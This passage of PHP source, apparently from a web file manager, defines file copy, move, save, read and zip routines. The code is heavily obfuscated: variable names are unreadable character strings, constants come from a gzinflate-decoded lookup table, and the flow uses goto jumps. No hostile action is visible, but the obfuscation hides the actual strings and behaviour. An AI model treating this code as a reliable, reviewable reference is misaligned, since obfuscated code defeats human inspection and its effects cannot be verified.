self::driverMake($Ïø±§®[0]); if (!$µÏÎâœÀ) { return !1; } if (method_exists($µÏÎâœÀ, $ÇÅªçú)) { $™Ÿ°Â = @call_user_func_array(array($µÏÎâœÀ, $ÇÅªçú), $Ïø±§®); } else { if (method_exists($µÏÎâœÀ, $¬ğéŒÍè[1246])) { $™Ÿ°Â = @call_user_func_array(array($µÏÎâœÀ, $ÇÅªçú), $Ïø±§®); } else { if (method_exists(self, $ÇÅªçú)) { $™Ÿ°Â = @call_user_func_array(array(self, $ÇÅªçú), $Ïø±§®); } else { $™Ÿ°Â = call_user_func_array(array(parent, $ÇÅªçú), $Ïø±§®); } } } Hook::trigger($¬ğéŒÍè[1244] . $ÇÅªçú . $¬ğéŒÍè[1247], $÷ôÖ§øÎ, $™Ÿ°Â); return $™Ÿ°Â; } public static function init($–ˆ€³¡¼) { return self::driverMake($–ˆ€³¡¼); } public static function copy($¢¼ÃğĞ, $ÖÈÇÅÊÄ, $éÑù£ïï = false, $—Ô“ëğ = false) { return self::copyMoveStart($¢¼ÃğĞ, $ÖÈÇÅÊÄ, $éÑù£ïï, $_SERVER[‹‰”››ê][635], $—Ô“ëğ); } public static function move($‚Ø±Àó, $è‚®·Ì“, $°ŒÊ‰¹È = false, $­Ë¯œÜË = false) { return self::copyMoveStart($‚Ø±Àó, $è‚®·Ì“, $°ŒÊ‰¹È, $_SERVER[‹‰”››ê][637], $­Ë¯œÜË); } public static function copyMoveChildren($İ¿£­ÏÔ, $à´¿—¹Ä, $ƒà°ğíğ = "\143\157\x70\171", $Á·ÃÄ¡È = REPEAT_REPLACE) { $ÚïÀÙ„ =& $_SERVER[‹‰”››ê]; $ßÀ¢³ÀÑ = $İ¿£­ÏÔ; $³ñÉÀ›¨ = self::driverMake($İ¿£­ÏÔ); $éÌ­Ë§ = $³ñÉÀ›¨->listPath($İ¿£­ÏÔ, !0); $ïÛÊÉšö = array_merge($éÌ­Ë§[$ÚïÀÙ„[86]], $éÌ­Ë§[$ÚïÀÙ„[85]]); foreach ($ïÛÊÉšö as $‘ÍĞ¥Ò©) { self::copyMoveStart($‘ÍĞ¥Ò©[$ÚïÀÙ„[87]], $à´¿—¹Ä, $Á·ÃÄ¡È, $ƒà°ğíğ, !1); } if ($ƒà°ğíğ == $ÚïÀÙ„[637]) { self::remove($ßÀ¢³ÀÑ); } } private static function copyMoveStart($Ğâ¶Şöğ, $èÛ©ÖŠ, $ÍĞù˜÷ò, $€åî˜ãÍ, $Ğ˜ã²Ì ) { $´£ü§‡ù =& $_SERVER[‹‰”››ê]; $³À°Ùº = array($Ğâ¶Şöğ, $èÛ©ÖŠ, $ÍĞù˜÷ò, $Ğ˜ã²Ì ); Hook::trigger($´£ü§‡ù[1244] . $€åî˜ãÍ . $´£ü§‡ù[1245], $³À°Ùº); $±ôŞÈÅ÷ = self::copyMove($Ğâ¶Şöğ, $èÛ©ÖŠ, $ÍĞù˜÷ò, $€åî˜ãÍ, $Ğ˜ã²Ì ); Hook::trigger($´£ü§‡ù[1244] . $€åî˜ãÍ . $´£ü§‡ù[1247], $³À°Ùº, $±ôŞÈÅ÷); return $±ôŞÈÅ÷; } public static function saveFile($Ğ®“˜”¯, $Áß–Ã„·, $Ùö”Äñ = true) { $“¦¿öÊ =& $_SERVER[‹‰”››ê]; $ÉÃÔÓ¼ = self::info($Áß–Ã„·); $ÒãÕüŞš = self::driverMake($Ğ®“˜”¯); $äÒ®õ¨å = self::driverMake($Áß–Ã„·); $ùÀÈ²üâ = !1; if ($äÒ®õ¨å->pathParse[$“¦¿öÊ[1248]]) { $ùÀÈ²üâ = $äÒ®õ¨å; $½³ËåÀ‰ = $äÒ®õ¨å->pathParse[$“¦¿öÊ[1248]]; $äÒ®õ¨å = self::driverMake($½³ËåÀ‰); } if ($ÒãÕüŞš->pathParse[$“¦¿öÊ[1248]]) { $ê±ÁùĞÛ = $ÒãÕüŞš->pathParse[$“¦¿öÊ[1248]]; $ÒãÕüŞš = self::driverMake($ê±ÁùĞÛ); } $ªøíÁ© = $äÒ®õ¨å->pathFather($Áß–Ã„·); $™ö©Ğîè = !0; if (!$Ùö”Äñ && self::driverIsSame($ÒãÕüŞš, $äÒ®õ¨å)) { $™ö©Ğîè = !1; } $í£Ù’İ = self::copyFile($ÒãÕüŞš, $Ğ®“˜”¯, $äÒ®õ¨å, $ªøíÁ©, $ÉÃÔÓ¼[$“¦¿öÊ[32]], $™ö©Ğîè); if ($ùÀÈ²üâ) { $í£Ù’İ = $ùÀÈ²üâ->getPathOuter($í£Ù’İ); } return $í£Ù’İ; } private static function copyMove($Ù«ó‹Ó», $º–«³¥, $Û±øì¡¬, $³ùôÅ÷, $©–ô•Û½ = false) { $©ô§¯È =& $_SERVER[‹‰”››ê]; if (!$Ù«ó‹Ó» || $Ù«ó‹Ó» == $©ô§¯È[8] || !$º–«³¥) { return !1; } ignore_timeout(); $”ùò”‰ = self::driverMake($Ù«ó‹Ó»); $£şÌÏ¯¦ = self::driverMake($º–«³¥); $ĞµâÆ™£ = $³ùôÅ÷ == $©ô§¯È[637]; $ç•õ¯ÖÉ = !1; if ($£şÌÏ¯¦->pathParse[$©ô§¯È[1248]]) { $ç•õ¯ÖÉ = $£şÌÏ¯¦; $º–«³¥ = $£şÌÏ¯¦->pathParse[$©ô§¯È[1248]]; $£şÌÏ¯¦ = self::driverMake($º–«³¥); } if ($”ùò”‰->pathParse[$©ô§¯È[1248]]) { $Ù«ó‹Ó» = $”ùò”‰->pathParse[$©ô§¯È[1248]]; $”ùò”‰ = self::driverMake($Ù«ó‹Ó»); } self::check($”ùò”‰, $Ù«ó‹Ó», $£şÌÏ¯¦, $º–«³¥); Hook::trigger($©ô§¯È[1249], $”ùò”‰, $Ù«ó‹Ó», $£şÌÏ¯¦, $º–«³¥); $õò¿÷¹Ù = self::driverIsSame($”ùò”‰, $£şÌÏ¯¦); if ($õò¿÷¹Ù) { if ($³ùôÅ÷ == $©ô§¯È[637] && !method_exists($£şÌÏ¯¦, $©ô§¯È[1250]) && trim($º–«³¥, $©ô§¯È[8]) == trim($£şÌÏ¯¦->pathFather($Ù«ó‹Ó»), $©ô§¯È[8])) { if ($”ùò”‰->pathThis($Ù«ó‹Ó») != $©–ô•Û½ && !$”ùò”‰->isOsDriver()) { return $”ùò”‰->rename($Ù«ó‹Ó», $©–ô•Û½); } return $£şÌÏ¯¦->getPathOuter($Ù«ó‹Ó»); } if (method_exists($£şÌÏ¯¦, $³ùôÅ÷)) { return $£şÌÏ¯¦->{$³ùôÅ÷}($Ù«ó‹Ó», $º–«³¥, $Û±øì¡¬, $©–ô•Û½); } } if ($õò¿÷¹Ù && $³ùôÅ÷ == $©ô§¯È[637] && $£şÌÏ¯¦->getType() == $©ô§¯È[109]) { $¿³ğ¿ = $£şÌÏ¯¦->movePath($Ù«ó‹Ó», $º–«³¥, $©–ô•Û½); if ($¿³ğ¿) { return $¿³ğ¿; } } $ÖÒ¡îì’ = $”ùò”‰->isFile($Ù«ó‹Ó»); if (!$ÖÒ¡îì’ && $£şÌÏ¯¦->getType() == $©ô§¯È[847] && $”ùò”‰->getType() == $©ô§¯È[109]) { $¿³ğ¿ = $£şÌÏ¯¦->copyFolderFromIO($”ùò”‰, $Ù«ó‹Ó», $º–«³¥, $Û±øì¡¬, $ĞµâÆ™£, $©–ô•Û½); } else { $¿³ğ¿ = self::copyPath($”ùò”‰, $Ù«ó‹Ó», $£şÌÏ¯¦, $º–«³¥, $Û±øì¡¬, $ĞµâÆ™£, $ÖÒ¡îì’, $©–ô•Û½); } if ($¿³ğ¿ && $ĞµâÆ™£) { $”ùò”‰->remove($Ù«ó‹Ó»); } if ($ç•õ¯ÖÉ) { $¿³ğ¿ = $ç•õ¯ÖÉ->getPathOuter($¿³ğ¿); } return $¿³ğ¿; } private static function check($“˜§èÇò, $«İÓÀùò, $ªñ„°Ú•, &$àõĞâ‡À) { $¨–Â¯Ú‘ =& $_SERVER[‹‰”››ê]; if (self::driverIsSame($“˜§èÇò, $ªñ„°Ú•) && $“˜§èÇò->isFolder($«İÓÀùò) && $“˜§èÇò->isParentOf($«İÓÀùò, $àõĞâ‡À)) { show_json(LNG($¨–Â¯Ú‘[1251]), !1); } if (!$“˜§èÇò->exist($«İÓÀùò)) { show_json(LNG($¨–Â¯Ú‘[108]), !1); } } private static function copyPath($áòÊ‰¤, $ñºçê§¾, $”şï•, $î£ÁÁéˆ, $¤ØÔ‚÷±, $Ó™ÒıîÇ, $©íÌ‹í÷, $¥¶—¥†Ş = false, $­´Ğ ÌÈ = true) { $¥£‡Ú¥ =& $_SERVER[‹‰”››ê]; $ãË¤»ş¼ = empty($¥¶—¥†Ş) && $¥¶—¥†Ş !== $¥£‡Ú¥[231] ? $áòÊ‰¤->pathThis($ñºçê§¾) : $¥¶—¥†Ş; if ($¤ØÔ‚÷±) { $Şˆ·¡Êú = $”şï•->fileNameExist($î£ÁÁéˆ, $ãË¤»ş¼); $Ä÷‡ëé = $ãË¤»ş¼; $ãË¤»ş¼ = $”şï•->fileNameAuto($î£ÁÁéˆ, $ãË¤»ş¼, $¤ØÔ‚÷±, !$©íÌ‹í÷); if (!$Şˆ·¡Êú || $Ä÷‡ëé != $ãË¤»ş¼) { $¤ØÔ‚÷± = !1; } if ($­´Ğ ÌÈ && !$¤ØÔ‚÷±) { $”şï•->_data[$¥£‡Ú¥[1252]] = !0; } } if ($©íÌ‹í÷) { return self::copyFile($áòÊ‰¤, $ñºçê§¾, $”şï•, $î£ÁÁéˆ, $ãË¤»ş¼, $Ó™ÒıîÇ); } if ($¤ØÔ‚÷± == REPEAT_RENAME_FOLDER) { $¤ØÔ‚÷± = !1; } $û”‡¯¥ä = rtrim($î£ÁÁéˆ, $¥£‡Ú¥[8]) . $¥£‡Ú¥[8] . $ãË¤»ş¼; $Ÿíº½¦÷ = $”şï•->mkdir($”şï•->getPath($û”‡¯¥ä), $¤ØÔ‚÷±); $î£ÁÁéˆ = $”şï•->getPathInner($Ÿíº½¦÷); $ïò¤Ø½¹ = $áòÊ‰¤->listPath($ñºçê§¾, !0); $ïò¤Ø½¹ = is_array($ïò¤Ø½¹) ? $ïò¤Ø½¹ : array($¥£‡Ú¥[86] => array(), $¥£‡Ú¥[85] => array()); $õüìá¬½ = array_merge($ïò¤Ø½¹[$¥£‡Ú¥[86]], $ïò¤Ø½¹[$¥£‡Ú¥[85]]); foreach ($õüìá¬½ as $ŞïÖ¿¾º) { $¹ŸĞ“÷ = $ŞïÖ¿¾º[$¥£‡Ú¥[33]] == $¥£‡Ú¥[233]; $ñºçê§¾ = $áòÊ‰¤->getPathInner($ŞïÖ¿¾º[$¥£‡Ú¥[87]]); $ŸÆ•¨š´ = self::copyPath($áòÊ‰¤, $ñºçê§¾, $”şï•, $î£ÁÁéˆ, $¤ØÔ‚÷±, $Ó™ÒıîÇ, $¹ŸĞ“÷, !1, !1); if (!$ŸÆ•¨š´) { IO::errorTips($¥£‡Ú¥[1253] . $ñºçê§¾ . $¥£‡Ú¥[73] . $î£ÁÁéˆ); } } self::copyMoveKeepInfo($áòÊ‰¤, $ñºçê§¾, $Ÿíº½¦÷); return $Ÿíº½¦÷; } private static function copyFile($ÈšËäñ«, $»ÍñÑ­±, $› Ø÷†³, $¥°½·, $‡øæğ¿, $á‹”æìÍ) { $ô¿¾öƒŒ =& $_SERVER[‹‰”››ê]; $¥°½· = $› Ø÷†³->getPath(rtrim($¥°½·, $ô¿¾öƒŒ[8]) . $ô¿¾öƒŒ[8] . $‡øæğ¿); $ø”ÂØ‹¯ = $ô¿¾öƒŒ[1254] . time() . rand_string(5); Hook::trigger($ô¿¾öƒŒ[1255], $ÈšËäñ«, $»ÍñÑ­±, $› Ø÷†³, $¥°½·, $‡øæğ¿, $ø”ÂØ‹¯); if (self::driverIsSame($ÈšËäñ«, $› Ø÷†³)) { if ($á‹”æìÍ) { $Š‰Š¡¡ = $› Ø÷†³->moveFile($»ÍñÑ­±, $¥°½·); } else { $Š‰Š¡¡ = $› Ø÷†³->copyFile($»ÍñÑ­±, $¥°½·); } Hook::trigger($ô¿¾öƒŒ[1256], $ÈšËäñ«, $»ÍñÑ­±, $› Ø÷†³, $¥°½·, $‡øæğ¿, $Š‰Š¡¡); self::copyMoveKeepInfo($ÈšËäñ«, $»ÍñÑ­±, $Š‰Š¡¡); return $Š‰Š¡¡; } $Êƒ±ßÂ = TEMP_FILES; if ($GLOBALS[$ô¿¾öƒŒ[6]][$ô¿¾öƒŒ[92]][$ô¿¾öƒŒ[888]]) { $Êƒ±ßÂ = $GLOBALS[$ô¿¾öƒŒ[6]][$ô¿¾öƒŒ[92]][$ô¿¾öƒŒ[888]]; } $ÙÅã‰ÁË = $Êƒ±ßÂ; mk_dir($ÙÅã‰ÁË); $É‡œ‰„” = $ÙÅã‰ÁË . $ø”ÂØ‹¯; $æà£é©„ = $É‡œ‰„”; $É‡œ‰„” = $ÈšËäñ«->download($»ÍñÑ­±, $É‡œ‰„”); $É‡œ‰„” = $ÈšËäñ«->iconvApp($É‡œ‰„”); if (substr($É‡œ‰„”, strlen($Êƒ±ßÂ)) == $Êƒ±ßÂ) { $á‹”æìÍ = !0; } $Š‰Š¡¡ = $› Ø÷†³->upload($¥°½·, $É‡œ‰„”, $á‹”æìÍ); self::remove($æà£é©„); Hook::trigger($ô¿¾öƒŒ[1256], $ÈšËäñ«, $»ÍñÑ­±, $› Ø÷†³, $¥°½·, $‡øæğ¿, $Š‰Š¡¡); self::copyMoveKeepInfo($ÈšËäñ«, $»ÍñÑ­±, $Š‰Š¡¡); return $Š‰Š¡¡; } private static function copyMoveKeepInfo($ùšü€åÃ, $ÊïÙ£ÍÁ, $Ãã•äğ) { if (!$Ãã•äğ) { return; } $±ç¦âò¥ = $ùšü€åÃ->info($ÊïÙ£ÍÁ); if (!is_array($±ç¦âò¥)) { return; } IO::setModifyTime($Ãã•äğ, $±ç¦âò¥[$_SERVER[‹‰”››ê][88]]); } public static function pathFather($ñÄºíõ) { $óÜ¶›£¡ = IO::init($ñÄºíõ); $œÓú¾Ç = $óÜ¶›£¡->pathFather($óÜ¶›£¡->path); return $óÜ¶›£¡->getPathOuter($œÓú¾Ç); } public static function fileOut($ìíÍÇ¶, $«µà„«Š = false, $ ñ€º’® = false, $‚¸ä«¡È = '') { $ñâ”¢¶Ò = self::driverMake($ìíÍÇ¶); if ($ñâ”¢¶Ò->isFileOutServer()) { return $ñâ”¢¶Ò->fileOutServer($ìíÍÇ¶, $«µà„«Š, $ ñ€º’®, $‚¸ä«¡È); } return $ñâ”¢¶Ò->fileOut($ìíÍÇ¶, $«µà„«Š, $ ñ€º’®, $‚¸ä«¡È); } public static function fileOutImage($Ú…ê°…ì, $ßãå = 250) { $ßÜ²¼ô€ = array(250, 600, 1200, 2000, 3000, 5000); for ($ûùŸûÊç = 0; $ûùŸûÊç < count($ßÜ²¼ô€); $ûùŸûÊç++) { if ($ûùŸûÊç == 0 && $ßãå <= $ßÜ²¼ô€[$ûùŸûÊç]) { $ßãå = $ßÜ²¼ô€[$ûùŸûÊç]; break; } else { if ($ßãå > $ßÜ²¼ô€[$ûùŸûÊç - 1] && $ßãå <= $ßÜ²¼ô€[$ûùŸûÊç]) { $ßãå = $ßÜ²¼ô€[$ûùŸûÊç]; break; } else { if ($ûùŸûÊç == count($ßÜ²¼ô€) - 1 && $ßãå > $ßÜ²¼ô€[$ûùŸûÊç]) { $ßãå = $ßÜ²¼ô€[$ûùŸûÊç]; break; } } } } $‘º¯ÄË = self::driverMake($Ú…ê°…ì); if ($‘º¯ÄË->isFileOutServer()) { return $‘º¯ÄË->fileOutImageServer($Ú…ê°…ì, $ßãå); } return $‘º¯ÄË->fileOutImage($Ú…ê°…ì, $ßãå); } private static function driverIsSame($Æ×¹Ä¨·, $Í‰ÙÜ§Œ) { $ˆ‰œŸÇâ =& $_SERVER[‹‰”››ê]; $Éú´«‚ë = $Æ×¹Ä¨·->getType(); $½è¨İ±§ = $Í‰ÙÜ§Œ->getType(); if ($Éú´«‚ë != $½è¨İ±§) { return !1; } if ($Éú´«‚ë == $ˆ‰œŸÇâ[847]) { return !0; } if ($Éú´«‚ë == $ˆ‰œŸÇâ[109]) { return !0; } if ($Æ×¹Ä¨·->pathDriver == $Í‰ÙÜ§Œ->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÚÁ˜¼–ß, $ãÖöÍğì) { $Éëç”›û =& $_SERVER[‹‰”››ê]; if (!IO::exist($ÚÁ˜¼–ß)) { return !1; } if (!IO::exist($ãÖöÍğì)) { IO::mkdir($ãÖöÍğì); } $ŒÑç»ÒÄ = array_to_keyvalue(self::listAllSimple($ÚÁ˜¼–ß), $Éëç”›û[87]); $óŸ¥òŠß = array_to_keyvalue(self::listAllSimple($ãÖöÍğì), $Éëç”›û[87]); $òúîÉÍÛ = array(); $ª²º×Ğ” = array(); foreach ($ŒÑç»ÒÄ as $†Œö¸³† => $÷ïÈÜ ¬) { if (isset($óŸ¥òŠß[$†Œö¸³†])) { if ($÷ïÈÜ ¬[$Éëç”›û[78]] == 1) { continue; } if ($óŸ¥òŠß[$†Œö¸³†][$Éëç”›û[79]] == $÷ïÈÜ ¬[$Éëç”›û[79]]) { continue; } } if ($÷ïÈÜ ¬[$Éëç”›û[78]] == 1) { $ª²º×Ğ”[] = $ãÖöÍğì . $Éëç”›û[8] . trim($†Œö¸³†, $Éëç”›û[8]); continue; } $½´ÆÌ¸ = strstr(trim($†Œö¸³†, $Éëç”›û[8]), $Éëç”›û[8]) ? get_path_father($†Œö¸³†) : $Éëç”›û[12]; $òúîÉÍÛ[] = array($Éëç”›û[1257] => $÷ïÈÜ ¬[$Éëç”›û[89]], $Éëç”›û[1258] => rtrim($ãÖöÍğì, $Éëç”›û[8]) . $Éëç”›û[8] . $½´ÆÌ¸, $Éëç”›û[1259] => $÷ïÈÜ ¬); } $˜ÌÖîØï = array($Éëç”›û[233] => $òúîÉÍÛ, $Éëç”›û[78] => $ª²º×Ğ”); Hook::trigger($Éëç”›û[1260], $ÚÁ˜¼–ß, $ãÖöÍğì, $˜ÌÖîØï); foreach ($ª²º×Ğ” as $÷ïÈÜ ¬) { IO::mkdir($÷ïÈÜ ¬); } foreach ($òúîÉÍÛ as $÷ïÈÜ ¬) { IO::copy($÷ïÈÜ ¬[$Éëç”›û[1257]], $÷ïÈÜ ¬[$Éëç”›û[1258]], REPEAT_REPLACE); } } public static function fileSubstr($ØğÀïïä, $œóÕ¦üû, $ááã²¨å = false) { $¯ïßé’ê =& $_SERVER[‹‰”››ê]; $ÏËË‚Å = self::driverMake($ØğÀïïä); $Ã£ãõºı = $ÏËË‚Å->size($ØğÀïïä); $ä¥Ê¢Áí = $œóÕ¦üû; $Óğè¹ƒ‡ = $ááã²¨å; if ($œóÕ¦üû < 0) { $œóÕ¦üû = $Ã£ãõºı + $œóÕ¦üû; } if ($ááã²¨å === !1) { $ááã²¨å = $Ã£ãõºı - $œóÕ¦üû; } if ($œóÕ¦üû + $ááã²¨å > $Ã£ãõºı) { $ááã²¨å = $Ã£ãõºı - $œóÕ¦üû; } if (!$Ã£ãõºı && $ÏËË‚Å->getType() == $¯ïßé’ê[109] && !$ÏËË‚Å->exist($ØğÀïïä)) { $Î¡ÀšŒÌ = get_path_this($ØğÀïïä); $á°‹Ä¾Ë = parse_url_query($Î¡ÀšŒÌ); if (is_array($á°‹Ä¾Ë) && isset($á°‹Ä¾Ë[$¯ïßé’ê[32]])) { $Î¡ÀšŒÌ = urldecode($á°‹Ä¾Ë[$¯ïßé’ê[32]]); } throw new Exception($¯ïßé’ê[1261] . LNG($¯ïßé’ê[1262]) . $¯ïßé’ê[1059] . clear_html($Î¡ÀšŒÌ) . $¯ïßé’ê[12]); } if ($ááã²¨å <= 0) { return $¯ïßé’ê[12]; } if ($œóÕ¦üû < 0 || $œóÕ¦üû >= $Ã£ãõºı || $ááã²¨å > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\145\122\x65\x61\144\x20\x65\x72\162\x6f\x72\x21\40\163\164\141\x72\x74\75{$œóÕ¦üû}\x3b\154\x65\x6e\147\x74\x68\75{$ááã²¨å}\x3b\x20\x73\x69\172\145\x3d{$Ã£ãõºı}\x3b"); } $ıØ­·ıİ = $ÏËË‚Å->fileSubstr($ØğÀïïä, $œóÕ¦üû, $ááã²¨å); if (!$ıØ­·ıİ && $ááã²¨å && isset($GLOBALS[$¯ïßé’ê[1263]])) { throw new Exception($GLOBALS[$¯ïßé’ê[1263]][$¯ïßé’ê[1264]]); } return $ıØ­·ıİ; } private static function driverMake(&$ŸÎä­›Ü) { $ÔÅ¯Ä‰ =& $_SERVER[‹‰”››ê]; $»çÜ²è = KodIO::parse($ŸÎä­›Ü); if (!self::$driverListSystem) { $ÔŞ¡·ºÕ = Model($ÔÅ¯Ä‰[857])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÔŞ¡·ºÕ, $ÔÅ¯Ä‰[487]); } if ($»çÜ²è[$ÔÅ¯Ä‰[33]] == KodIO::KOD_IO && !self::$driverListSystem[$»çÜ²è[$ÔÅ¯Ä‰[487]]]) { throw new Exception($ÔÅ¯Ä‰[1265]); return !1; } $ŸÎä­›Ü = $»çÜ²è[$ÔÅ¯Ä‰[1266]]; $° “ºÖ = self::driverGet($»çÜ²è, $ŸÎä­›Ü); return $° “ºÖ; } private static function driverGet($¼ùŒÎÈ˜, &$×Ã—´¿Ì) { $õÁü¶Üí =& $_SERVER[‹‰”››ê]; $¬ñ¥õ Ç = $¼ùŒÎÈ˜[$õÁü¶Üí[1267]]; $åÂÑ­—‹ = $¼ùŒÎÈ˜[$õÁü¶Üí[487]]; switch ($¼ùŒÎÈ˜[$õÁü¶Üí[33]]) { case KodIO::KOD_IO: $ú«ÒİÑÅ = self::$driverListSystem[$åÂÑ­—‹]; break; case KodIO::KOD_SOURCE: $×Ã—´¿Ì = $åÂÑ­—‹ . $×Ã—´¿Ì; $ú«ÒİÑÅ = array($õÁü¶Üí[1268] => $õÁü¶Üí[1269], $õÁü¶Üí[6] => $¼ùŒÎÈ˜); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $×šŒ—Šª = $GLOBALS[$õÁü¶Üí[1270]]; self::$driverListUser = array_to_keyvalue($×šŒ—Šª, $õÁü¶Üí[487]); } $ú«ÒİÑÅ = self::$driverListUser[$åÂÑ­—‹]; break; case KodIO::KOD_SHARE_LINK: $ú«ÒİÑÅ = array($õÁü¶Üí[1268] => $õÁü¶Üí[1271], $õÁü¶Üí[6] => $¼ùŒÎÈ˜); $°°…¡£‹ = Action($õÁü¶Üí[1272])->sharePathInfo($¼ùŒÎÈ˜[$õÁü¶Üí[87]]); $×Ã—´¿Ì = $°°…¡£‹[$õÁü¶Üí[194]]; if (!$°°…¡£‹[$õÁü¶Üí[194]]) { $æ£»«¬ş = Model($õÁü¶Üí[681])->getInfo($°°…¡£‹[$õÁü¶Üí[682]]); $×Ã—´¿Ì = KodIO::clear($æ£»«¬ş[$õÁü¶Üí[1273]] . $¼ùŒÎÈ˜[$õÁü¶Üí[1266]]); $¼ùŒÎÈ˜[$õÁü¶Üí[574]] = $æ£»«¬ş; $¼ùŒÎÈ˜[$õÁü¶Üí[1248]] = $×Ã—´¿Ì; $ú«ÒİÑÅ = array($õÁü¶Üí[1268] => $õÁü¶Üí[1274], $õÁü¶Üí[6] => $¼ùŒÎÈ˜); } break; case KodIO::KOD_SHARE_ITEM: $ú«ÒİÑÅ = array($õÁü¶Üí[1268] => $õÁü¶Üí[1275], $õÁü¶Üí[6] => $¼ùŒÎÈ˜); $æ£»«¬ş = Model($õÁü¶Üí[681])->getInfo($¼ùŒÎÈ˜[$õÁü¶Üí[487]]); if ($æ£»«¬ş[$õÁü¶Üí[194]] == $õÁü¶Üí[231]) { $×Ã—´¿Ì = KodIO::clear($æ£»«¬ş[$õÁü¶Üí[1273]] . $¼ùŒÎÈ˜[$õÁü¶Üí[1266]]); $¼ùŒÎÈ˜[$õÁü¶Üí[574]] = $æ£»«¬ş; $¼ùŒÎÈ˜[$õÁü¶Üí[1248]] = $×Ã—´¿Ì; $ú«ÒİÑÅ = array($õÁü¶Üí[1268] => $õÁü¶Üí[1276], $õÁü¶Üí[6] => $¼ùŒÎÈ˜); } else { if (!$×Ã—´¿Ì) { $×Ã—´¿Ì = $æ£»«¬ş[$õÁü¶Üí[194]]; } } break; default: $×Ã—´¿Ì = $¼ùŒÎÈ˜[$õÁü¶Üí[87]]; $ú«ÒİÑÅ = array($õÁü¶Üí[1268] => $õÁü¶Üí[1277]); break; } $ùùíÛ… = $¼ùŒÎÈ˜[$õÁü¶Üí[87]]; if (!isset(self::$driverCache[$ùùíÛ…])) { $€Ü®âºÇ = strtolower($ú«ÒİÑÅ[$õÁü¶Üí[98]]); $£˜¹ÈŞÒ = $GLOBALS[$õÁü¶Üí[6]][$õÁü¶Üí[92]][$õÁü¶Üí[921]]; $ÃÅ‰óïê = $õÁü¶Üí[77] . (isset($£˜¹ÈŞÒ[$€Ü®âºÇ]) ? $£˜¹ÈŞÒ[$€Ü®âºÇ] : ucfirst($€Ü®âºÇ)); if (!class_exists($ÃÅ‰óïê)) { show_json("{$ÃÅ‰óïê}\40\156\x6f\x74\40\x65\x78\151\163\164\x73\x21", !1); } $û¤î‡º = isset($ú«ÒİÑÅ[$õÁü¶Üí[6]]) ? $ú«ÒİÑÅ[$õÁü¶Üí[6]] : !1; self::$driverCache[$ùùíÛ…] = new $ÃÅ‰óïê($û¤î‡º); } $°ÈÃ¡Ò´ = self::$driverCache[$ùùíÛ…]; $°ÈÃ¡Ò´->pathDriver = $¬ñ¥õ Ç; $°ÈÃ¡Ò´->pathBase = $õÁü¶Üí[12]; if (isset($ú«ÒİÑÅ[$õÁü¶Üí[6]][$õÁü¶Üí[1278]])) { $°ÈÃ¡Ò´->pathBase = rtrim($ú«ÒİÑÅ[$õÁü¶Üí[6]][$õÁü¶Üí[1278]], $õÁü¶Üí[8]) . $õÁü¶Üí[8]; $×Ã—´¿Ì = $°ÈÃ¡Ò´->pathBase . ltrim($×Ã—´¿Ì, $õÁü¶Üí[8]); } $×Ã—´¿Ì = $°ÈÃ¡Ò´->getPath($×Ã—´¿Ì); if (isset($¼ùŒÎÈ˜[$õÁü¶Üí[1248]])) { $×Ã—´¿Ì = $¼ùŒÎÈ˜[$õÁü¶Üí[1248]]; } $°ÈÃ¡Ò´->path = $×Ã—´¿Ì; return $°ÈÃ¡Ò´; } public static function errorTips($àÎèñ³ = false) { $Œ–´€ş´ =& $_SERVER[‹‰”››ê]; static $ô›€êî = array(); $èÎÙŒ• = 1000; if ($àÎèñ³ === -1) { return $ô›€êî ? $ô›€êî[count($ô›€êî) - 1] : $Œ–´€ş´[12]; } if ($àÎèñ³ === !1) { return implode($Œ–´€ş´[288], $ô›€êî); } if (count($ô›€êî) >= $èÎÙŒ•) { $ô›€êî = array_slice($ô›€êî, $èÎÙŒ• * 0.5, $èÎÙŒ•); } $ô›€êî[] = $àÎèñ³; write_log($Œ–´€ş´[176] . ACTION . $Œ–´€ş´[1279] . $àÎèñ³, $Œ–´€ş´[1280]); } public static function getLastError($º¶—¨¥Ñ = '') { $Ñ˜ê‚³ = self::errorTips(-1); return $Ñ˜ê‚³ ? $Ñ˜ê‚³ : $º¶—¨¥Ñ; } } goto Eè™âµÄ; Fõ†·ÁŞù: $_SERVER[¢Î¨ùä°] = explode($_SERVER[‹‰”››ê][697], gzinflate(substr($_SERVER[‹‰”››ê][698], 10, -8))); $nmwlctqxar = $_SERVER[‹‰”››ê][699]; while ($nmwlctqxar < $_SERVER[‹‰”››ê][700]) { if ($nmwlctqxar >= 0) { break; } $nmwlctqxar++; } goto Eïâç½‚±Á; Eè™âµÄ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $˜ùû©Şâ; if ($˜ùû©Şâ) { return $˜ùû©Şâ; } $×ıÜê£º = IO::init($_SERVER[‹‰”››ê][8]); return $×ıÜê£º; } private static function iconvSystem($Í¯åß¼) { return self::local()->iconvSystem($Í¯åß¼); } private static function iconvApp($‘Æ¢Ù³ê) { return self::local()->iconvApp($‘Æ¢Ù³ê); } public static function zipFolder($¨Å´ôî, $¥˜Ê¯Ğ´ = "\x7a\151\160", $¿“‘äĞ = '', $Œ‚ñ = REPEAT_RENAME) { $ÍÙªà =& $_SERVER[‹‰”››ê]; $©ºˆ¢¤’ = IO::listPath($¨Å´ôî); if (!$©ºˆ¢¤’) { return !1; } $©ºˆ¢¤’ = array_merge($©ºˆ¢¤’[$ÍÙªà[85]], $©ºˆ¢¤’[$ÍÙªà[86]]); return self::zip($©ºˆ¢¤’, $¥˜Ê¯Ğ´, $¿“‘äĞ, $Œ‚ñ); } public static function zip($ŞàîÊôÕ, $Å×•áôö = "\x7a\151\x70", $©ÅïÂŒà = '', $‡šé±ú– = REPEAT_RENAME) { $À½½ÃÌ =& $_SERVER[‹‰”››ê]; if (is_string($ŞàîÊôÕ) && $ŞàîÊôÕ) { $ŞàîÊôÕ = array(array($À½½ÃÌ[87] => $ŞàîÊôÕ)); } $İºĞê¼á = self::init($ŞàîÊôÕ[0][$À½½ÃÌ[87]]); $ßªú÷»– = self::info($ŞàîÊôÕ[0][$À½½ÃÌ[87]]); $¨–È´“º = $À½½ÃÌ[12]; $êô¦Å± = $À½½ÃÌ[12]; $„ºœòş¢ = $À½½ÃÌ[12]; if ($©ÅïÂŒà && substr($©ÅïÂŒà, -1, 1) != $À½½ÃÌ[8]) { $êô¦Å± = get_path_father($©ÅïÂŒà); $„ºœòş¢ = get_path_this($©ÅïÂŒà); } else { $êô¦Å± = self::pathFather($ßªú÷»–[$À½½ÃÌ[87]]); 